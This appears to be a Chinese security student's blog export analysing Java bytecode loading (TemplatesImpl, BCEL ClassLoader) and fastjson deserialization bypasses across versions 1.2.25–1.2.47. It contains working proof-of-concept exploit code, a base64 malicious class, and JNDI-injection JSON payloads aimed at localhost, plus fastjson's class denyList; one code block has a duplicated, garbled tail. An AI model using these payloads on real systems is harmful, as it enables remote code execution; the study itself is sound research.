<p>首先想要不报错if (_transletIndex &lt; 0)必须为flase,所以往上看,发现赋值语句</p>
<p><code>_transletIndex = i;</code>这里和之前提到的撞上了是吧,只要这个有那之前那个（<code>_class[_transletIndex]</code>）也解决了，在往上看要这个要赋值得</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) 为<span class="literal">true</span>才行</span><br><span class="line"> 而这里superclass为<span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line">_class[i]怎么来的之前也知道了所以直接都串上了</span><br></pre></td></tr></table></figure>

<p>所以条件要_bytecodes[i]的父类为AbstractTranslet才行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">ABSTRACT_TRANSLET</span></span><br><span class="line">       <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>至于外部加载类怎么写的弹计算器</p>
<p>POC:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.lagou;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">io</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">io</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;cacl&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解释以下为什么多了两个transform方法,然后将它编译+base64编码了javac io.java | cat io.class|base64</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">这里是因为子类需要实现父类里面的抽象方法，同时因为父类是抽象类，可能没有将接口的方法全部实现，</span><br><span class="line">这时子类如果不是抽象的，那必须将其他接口方法都实现。</span><br><span class="line">这里面 `transform(DOM document, DTMAxisIterator iterator,SerializationHandler handler)</span><br><span class="line">是父类里面的抽象方法所以要重写</span><br><span class="line">transform(DOM document, SerializationHandler[] handlers)是父类没有实现接口的方法所以要重写</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//poc</span></span><br><span class="line"><span class="keyword">package</span> com.lagou;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(                <span class="string">&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +</span><br><span class="line">                <span class="string">&quot;AA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQAJdHJhbnNmb3JtAQByKExjb20vc3Vu&quot;</span> +</span><br><span class="line">                <span class="string">&quot;L29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +</span><br><span class="line">                <span class="string">&quot;L3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAbAQCmKExj&quot;</span> +</span><br><span class="line">                <span class="string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9h&quot;</span> +</span><br><span class="line">                <span class="string">&quot;cGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNo&quot;</span> +</span><br><span class="line">                <span class="string">&quot;ZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJj&quot;</span> +</span><br><span class="line">                <span class="string">&quot;ZUZpbGUBAAdpby5qYXZhDAAHAAgHABwMAB0AHgEABGNhbGMMAB8AIAEADGNvbS9sYWdvdS9pbwEA&quot;</span> +</span><br><span class="line">                <span class="string">&quot;QGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0&quot;</span> +</span><br><span class="line">                <span class="string">&quot;VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFu&quot;</span> +</span><br><span class="line">                <span class="string">&quot;L2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApn&quot;</span> +</span><br><span class="line">                <span class="string">&quot;ZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0&quot;</span> +</span><br><span class="line">                <span class="string">&quot;cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABgAAAAAAAwABAAcACAACAAkAAAAuAAIAAQAA&quot;</span> +</span><br><span class="line">                <span class="string">&quot;AA4qtwABuAACEgO2AARXsQAAAAEACgAAAA4AAwAAAAoABAALAA0ADAALAAAABAABAAwAAQANAA4A&quot;</span> +</span><br><span class="line">                <span class="string">&quot;AgAJAAAAGQAAAAMAAAABsQAAAAEACgAAAAYAAQAAAA8ACwAAAAQAAQAPAAEADQAQAAIACQAAABkA&quot;</span> +</span><br><span class="line">                <span class="string">&quot;AAAEAAAAAbEAAAABAAoAAAAGAAEAAAASAAsAAAAEAAEADwABABEAAAACABI=&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">mpl</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(mpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;baicany&quot;</span>);</span><br><span class="line">        setFieldValue(mpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(mpl,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(mpl,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        mpl.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object Value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, Value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;mpl,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(mpl,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        mpl.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object Value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, Value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>弹出计算器</p>
<h1 id="利用BCEL-ClassLoader加载字节码"><a href="#利用BCEL-ClassLoader加载字节码" class="headerlink" title="利用BCEL ClassLoader加载字节码"></a>利用BCEL ClassLoader加载字节码</h1><p>关于BCEL先看看p神的：<a href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html#0x01-bcel">https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html#0x01-bcel</a></p>
<p>BCEL属于Apache Commons项目下的一个子项目，全名应Apache Commons BCE，它提供了一系列用于分析、修改和创建Java Class文件的API，从库功能来看，使用性远不及其他库，但被Apache Xalan所使用，而Apache Xalan又是Java内部对于JAXP的实现，所以BCEL也被包含在了JDK的原生库中位com.sun.org.apache.bcel。</p>
<p>JAXP全名是<a href="https://zh.wikipedia.org/wiki/JAXP">Java API for XML Processing</a> 是Java定义的⼀系列接⼝，⽤于处理XML相关的逻辑，包括DOM、SAX、StAX、XSLT等。Apache Xalan实现了其中XSLT相关 的部分，其中包括xsltc compiler。 xsltc compiler是⼀个命令⾏编辑器，可以将⼀个xsl⽂件编译成⼀个class⽂件或者jar⽂件</p>
<p>XSLT（扩展样式表转换语言）是一种为可扩展置标语言提供表达形式而设计的计算机语言，主要用于将XML转换成其他格式的数据。既然是一门动态“语言”，在Java中必然会先被编译成Java，才能够执行。</p>
<p><strong>BCEL包中有<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>类，它是一个<code>ClassLoader</code>，但重写了Java内置的<code>ClassLoader#LoadClass</code>方法</strong></p>
<p>在LoadClass中，会判断类名是否是<code>$$BCEL$$</code>开头，如果是的话，将会对这个字符串进行<code>decode</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">if</span>(clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="type">byte</span>[] bytes  = clazz.getBytes();</span><br><span class="line">    cl = defineClass(class_name, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="comment">// Fourth try: Use default class loader</span></span><br><span class="line">    cl = Class.forName(class_name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用deifine方法</p>
<p>编写恶意类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">calc</span>&#123;</span><br><span class="line">    <span class="keyword">static</span>  &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后通过BCEL提供的两个类<code>Repository</code>和<code>utility</code>来利用:</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">Repository用于将一个<span class="keyword">Java </span>Class先转换成原生字节码（也可以直接<span class="keyword">javac编译获得）提供了lookupClass⽅法⽤于加载⼀个类</span></span><br><span class="line"><span class="keyword"></span>utility用于将原生字节码转换成<span class="keyword">BCEL格式的字节码</span></span><br></pre></td></tr></table></figure>

<p>poc</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">l</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="type">JavaClass</span> <span class="variable">clazz</span> <span class="operator">=</span> Repository.lookupClass(calc.class);</span><br><span class="line"><span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(clazz.getBytes(), <span class="literal">true</span>);</span><br><span class="line">System.out.println(code);</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ClassLoader</span>().loadClass(<span class="string">&quot;$$BCEL$$&quot;</span> + code).newInstance();</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>fastjsonのtwo!</title>
    <url>/2023/11/08/fastjson2/</url>
    <content><![CDATA[<p><strong>前言</strong></p>
<p>在之前分析了反序列化的过程后,跟在su18师傅学其他版本的绕过<br>c,快期末了,考试是真的多,课也是真的多!!!,老师也是真的…,好多作业,啊啊啊,好想只用学java的日子,o(╥﹏╥)o</p>
<p>测某平台是真的难蹦</p>
<h3 id="fastjson-1-2-25"><a href="#fastjson-1-2-25" class="headerlink" title="fastjson-1.2.25"></a>fastjson-1.2.25</h3><p>在版本 1.2.25 中，官方对之前的反序列化漏洞进行了修复，引入了 checkAutoType 安全机制，默认情况下 autoTypeSupport 关闭，不能直接反序列化任意类，而打开 AutoType 之后，是基于内置黑名单来实现安全的，fastjson 也提供了添加黑名单的接口。</p>
<p>影响版本：<code>1.2.25 &lt;= fastjson &lt;= 1.2.41</code></p>
<p>在 <code>com.alibaba.fastjson.parser.ParserConfig</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">boolean</span>                                         <span class="variable">autoTypeSupport</span> <span class="operator">=</span> AUTO_SUPPORT;</span><br><span class="line">   <span class="keyword">private</span> String[]                                        denyList        = <span class="string">&quot;bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework&quot;</span>.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">   <span class="keyword">private</span> String[]                                        acceptList      = AUTO_TYPE_ACCEPT_LIST;</span><br></pre></td></tr></table></figure>

<p>默认AUTO_SUPPORT为false字符串数组 denyList ，是反序列化类的黑名单；acceptList 是反序列化白名单。</p>
<p>添加白名单就从这个入手</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">DENY_PROPERTY</span> <span class="operator">=</span> <span class="string">&quot;fastjson.parser.deny&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">AUTOTYPE_ACCEPT</span> <span class="operator">=</span> <span class="string">&quot;fastjson.parser.autoTypeAccept&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">AUTOTYPE_SUPPORT_PROPERTY</span> <span class="operator">=</span> <span class="string">&quot;fastjson.parser.autoTypeSupport&quot;</span>;</span><br></pre></td></tr></table></figure>

<ol>
<li>使用代码进行添加：<code>ParserConfig.getGlobalInstance().addAccept(xxx”)</code></li>
<li>加上JVM启动参数：<code>-Dfastjson.parser.autoTypeAccept=xxx</code></li>
<li>在fastjson.properties中添加：<code>fastjson.parser.autoTypeAccept=xxx</code></li>
</ol>
<p>还是按照之前jndi,payload调试看看和之前哪里不一样了</p>
<p><img src="https://baicany.github.io/images/image-20231127144859759.png" alt="image-20231127144859759"></p>
<p>发现在这会检查我们的类,之前在这里没有检查就加载字节码了</p>
<p>看看checkAutoType函数的逻辑</p>
<p><img src="https://baicany.github.io/images/image-20231127145224159.png" alt="image-20231127145224159"></p>
<p>首先会看是否开启允许开启任意类的反序列化，先看类名是不是白名单里的类，是的话就会直接加载字节码，不是就会看是不是黑名单的类</p>
<p>在看后面</p>
<p><img src="https://baicany.github.io/images/image-20231127145731738.png" alt="image-20231127145731738"></p>
<p>如果不允许自定义反序列化的,还是会看是不是黑名单和白名单的类来加载字节码,虽然抛出错误是autotype,其实还是黑名单和白名单的事,只有白名单才能加载字节码</p>
<p>再然后就是就和之前差不多,就不用分析了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">    clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以想要利用要么有这个白名单,但是那是基本不可能的,所以条件得是在运行自定义反序列化条件下,想办法绕过黑名单了,之前也分析过,在loadclass方法下</p>
<p><img src="https://baicany.github.io/images/image-20231127150529441.png" alt="image-20231127150529441"></p>
<p>会将L和;或者[去除再来加载字节码,所以这里有个逻辑漏洞,所以这个漏洞也可以用在之前的版本</p>
<p>所以payload直接就是</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">      <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\n&quot;</span> +</span><br><span class="line">              <span class="string">&quot;    \&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:9999/baicany\&quot;,\n&quot;</span> +</span><br><span class="line">              <span class="string">&quot;    \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">      JSON.parse(json);</span><br></pre></td></tr></table></figure>

<h3 id="astjson-1-2-42"><a href="#astjson-1-2-42" class="headerlink" title="astjson-1.2.42"></a>astjson-1.2.42</h3><p>在版本 1.2.42 中，fastjson 继续延续了黑白名单的检测模式，但是将黑名单类从白名单修改为使用 HASH 的方式进行对比，这是为了防止安全研究人员根据黑名单中的类进行反向研究，用来对未更新的历史版本进行攻击。同时，作者对之前版本一直存在的使用类描述符绕过黑名单校验的问题尝试进行了修复。</p>
<p>还是关注 <code>com.alibaba.fastjson.parser.ParserConfig</code> 这个类，作者将原本的明文黑名单转为使用了 Hash 黑名单，防止安全人员对其研究。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="built_in">this</span>.denyHashCodes = <span class="keyword">new</span> <span class="title class_">long</span>[]&#123;-<span class="number">8720046426850100497L</span>, -<span class="number">8109300701639721088L</span>, -<span class="number">7966123100503199569L</span>, -<span class="number">7766605818834748097L</span>, -<span class="number">6835437086156813536L</span>, -<span class="number">4837536971810737970L</span>, -<span class="number">4082057040235125754L</span>, -<span class="number">2364987994247679115L</span>, -<span class="number">1872417015366588117L</span>, -<span class="number">254670111376247151L</span>, -<span class="number">190281065685395680L</span>, <span class="number">33238344207745342L</span>, <span class="number">313864100207897507L</span>, <span class="number">1203232727967308606L</span>, <span class="number">1502845958873959152L</span>, <span class="number">3547627781654598988L</span>, <span class="number">3730752432285826863L</span>, <span class="number">3794316665763266033L</span>, <span class="number">4147696707147271408L</span>, <span class="number">5347909877633654828L</span>, <span class="number">5450448828334921485L</span>, <span class="number">5751393439502795295L</span>, <span class="number">5944107969236155580L</span>, <span class="number">6742705432718011780L</span>, <span class="number">7179336928365889465L</span>, <span class="number">7442624256860549330L</span>, <span class="number">8838294710098435315L</span>&#125;;</span><br><span class="line"><span class="type">long</span>[] hashCodes = <span class="keyword">new</span> <span class="title class_">long</span>[AUTO_TYPE_ACCEPT_LIST.length];</span><br></pre></td></tr></table></figure>

<p>在checkautotype中把之前的判断逻辑全换成了hash来判断….,</p>
<p><img src="https://baicany.github.io/images/image-20231127153812002.png" alt="image-20231127153812002"></p>
<p><img src="https://baicany.github.io/images/image-20231127153549456.png" alt="image-20231127153549456"></p>
<p>然后再classload中改了会将L和;去除再loadclass一遍,这样也并没有什么区别和之前</p>
<p>双写绕过就可以了</p>
<figure class="highlight wren"><table><tr><td class="code"><pre><span class="line">    <span class="title class_">ParserConfig</span>.<span class="property">getGlobalInstance</span>().<span class="property">setAutoTypeSupport</span>(<span class="literal">true</span>);</span><br><span class="line">    <span class="title class_">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;<span class="char escape_">\&quot;</span>@type<span class="char escape_">\&quot;</span>:<span class="char escape_">\&quot;</span>LLcom.sun.rowset.JdbcRowSetImpl;;<span class="char escape_">\&quot;</span>,<span class="char escape_">\n</span>&quot;</span> <span class="operator">+</span></span><br><span class="line">            <span class="string">&quot;    <span class="char escape_">\&quot;</span>dataSourceName<span class="char escape_">\&quot;</span>:<span class="char escape_">\&quot;</span>rmi://127.0.0.1:9999/baicany<span class="char escape_">\&quot;</span>,<span class="char escape_">\n</span>&quot;</span> <span class="operator">+</span></span><br><span class="line">            <span class="string">&quot;    <span class="char escape_">\&quot;</span>autoCommit<span class="char escape_">\&quot;</span>:true&#125;&quot;</span>;</span><br><span class="line">    <span class="variable">JSON</span>.<span class="property">parse</span>(<span class="variable">json</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="fastjson-1-2-43"><a href="#fastjson-1-2-43" class="headerlink" title="fastjson-1.2.43"></a>fastjson-1.2.43</h3><p>这个版本主要是修复上一个版本中双写绕过的问题。</p>
<p>描述：上有政策，下有对策。在 <code>L</code>、<code>;</code> 被进行了限制后，安全研究人员将目光转向了 <code>[</code>。</p>
<p>可以看到用来检查的 <code>checkAutoType</code> 代码添加了判断，如果类名连续出现了两个 <code>L</code> 将会抛出异常，</p>
<p><img src="https://baicany.github.io/images/image-20231128104543004.png" alt="image-20231128104543004"></p>
<p>exp:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[,\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;    &#123;\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:9999/baicany\&quot;,\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;    \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">JSON.parse(json);</span><br></pre></td></tr></table></figure>

<h3 id="fastjson-1-2-44"><a href="#fastjson-1-2-44" class="headerlink" title="fastjson-1.2.44"></a>fastjson-1.2.44</h3><p>这个版本主要是修复上一个版本中使用 <code>[</code> 绕过黑名单防护的问题。</p>
<p>可以看到在 <code>checkAutoType</code> 中添加了新的判断，如果类名以 <code>[</code> 开始则直接抛出异常。</p>
<p><img src="https://baicany.github.io/images/image-20231128105326486.png" alt="image-20231128105326486"></p>
<h3 id="fastjson-1-2-45"><a href="#fastjson-1-2-45" class="headerlink" title="fastjson-1.2.45"></a>fastjson-1.2.45</h3><p>在此版本爆出了一个黑名单绕过，实际上，黑名单是无穷无尽的，随着 fastjson 的版本更新，一定会有更多的黑名单爆出来，因为隔壁 jackson 都是明文黑名单的，只要隔壁一更新，大家都看到了，就会拿来看 fastjson。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span>,</span><br><span class="line">    <span class="string">&quot;properties&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;data_source&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:9999/baicany&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="fastjson-1-2-47"><a href="#fastjson-1-2-47" class="headerlink" title="fastjson-1.2.47"></a>fastjson-1.2.47</h3><p>在 fastjson 不断迭代到 1.2.47 时，爆出了最为严重的漏洞，可以在不开启 AutoTypeSupport 的情况下进行反序列化的利用。</p>
<blockquote>
<p>影响版本：<code>1.2.25 &lt;= fastjson &lt;= 1.2.32 未开启 AutoTypeSupport</code> 影响版本：<code>1.2.33 &lt;= fastjson &lt;= 1.2.47</code> 描述：作者删除了一个 fastjson 的测试文件：<code>https://github.com/alibaba/fastjson/commit/be41b36a8d748067ba4debf12bf236388e500c66</code> ，里面包含了这次通杀漏洞的 payload。</p>
</blockquote>
<p>本次Fastjson反序列化漏洞也是基于<code>checkAutoType()</code>函数绕过的，并且<strong>无需开启AutoTypeSupport</strong>，大大提高了成功利用的概率。</p>
<p>绕过的大体思路是通过 java.lang.Class，将JdbcRowSetImpl类加载到Map中缓存，从而绕过AutoType的检测。因此将payload分两次发送，第一次加载，第二次执行。默认情况下，只要遇到没有加载到缓存的类，<code>checkAutoType()</code>就会抛出异常终止程序。</p>
<p>不受AutoTypeSupport影响的版本为1.2.33-1.2.47，本次调试的是1.2.47版本。</p>
<p>在 <code>checkAutoType()</code>中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">   <span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="type">int</span> features) &#123;</span><br><span class="line">        <span class="keyword">if</span> (typeName == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (typeName.length() &lt; <span class="number">128</span> &amp;&amp; typeName.length() &gt;= <span class="number">3</span>) &#123;</span><br><span class="line">            类名&lt;<span class="number">128</span>&amp;&amp;&gt;=<span class="number">3</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">            Class&lt;?&gt; clazz = <span class="literal">null</span>;</span><br><span class="line">            <span class="type">long</span> <span class="variable">BASIC</span> <span class="operator">=</span> -<span class="number">3750763034362895579L</span>;<span class="comment">//;</span></span><br><span class="line">            <span class="type">long</span> <span class="variable">PRIME</span> <span class="operator">=</span> <span class="number">1099511628211L</span>;<span class="comment">//L</span></span><br><span class="line">            <span class="type">long</span> <span class="variable">h1</span> <span class="operator">=</span> (-<span class="number">3750763034362895579L</span> ^ (<span class="type">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span>;</span><br><span class="line">            <span class="keyword">if</span> (h1 == -<span class="number">5808493101479473382L</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                不能开头为[</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((h1 ^ (<span class="type">long</span>)className.charAt(className.length() - <span class="number">1</span>)) * <span class="number">1099511628211L</span> == <span class="number">655701488918567152L</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                <span class="comment">//不能[开头;结尾</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">long</span> <span class="variable">h3</span> <span class="operator">=</span> (((-<span class="number">3750763034362895579L</span> ^ (<span class="type">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span> ^ (<span class="type">long</span>)className.charAt(<span class="number">1</span>)) * <span class="number">1099511628211L</span> ^ (<span class="type">long</span>)className.charAt(<span class="number">2</span>)) * <span class="number">1099511628211L</span>;</span><br><span class="line">                <span class="type">long</span> hash;</span><br><span class="line">                